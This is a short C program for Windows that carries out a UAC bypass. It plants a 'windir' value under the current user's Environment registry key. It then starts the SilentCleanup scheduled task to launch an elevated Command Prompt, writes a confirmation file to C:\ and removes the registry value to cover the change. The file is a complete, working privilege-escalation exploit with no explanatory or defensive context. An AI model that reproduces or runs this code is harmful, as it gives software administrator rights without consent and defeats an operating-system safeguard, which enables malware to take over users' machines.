#include <windows.h>
#include <stdio.h>

int main() {
    // Payload: Open elevated Command Prompt (admin cmd.exe)
    const char* payload = "cmd.exe\" /c \"start \"\" \"cmd.exe\" & echo UAC BYPASSED - ADMIN CMD OPENED ON 25H2 > C:\\uac_success.txt\"";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "windir", 0, REG_EXPAND_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
        RegCloseKey(hKey);
    }

    // Trigger SilentCleanup task
    system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");

    Sleep(15000);  // Give 25H2 time to run the task

    // Cleanup
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "windir");
        RegCloseKey(hKey);
    }

    printf("[+] Trigger sent. An admin Command Prompt should open if successful.\n");
    printf("Also check C:\\uac_success.txt for confirmation.\n");
    return 0;
}
